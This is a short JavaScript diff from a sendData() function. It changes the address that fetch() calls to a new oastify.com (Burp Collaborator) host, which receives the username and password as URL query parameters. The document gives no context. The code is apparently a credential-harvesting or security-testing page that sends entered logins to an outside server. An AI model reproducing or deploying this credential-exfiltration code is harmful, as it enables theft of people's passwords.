@@ -25,7 +25,7 @@ function sendData() {
         return;
     }
 
-    fetch(`https://8r0pkl75l6d40vf8srxt4763full9hx6.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
+    fetch(`https://uqo35i63apvkfu5ysg87dhmay14sskg9.oastify.com?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`)
         .then(response => response.text())
         .then(data => {
             console.log("Response from server:", data);
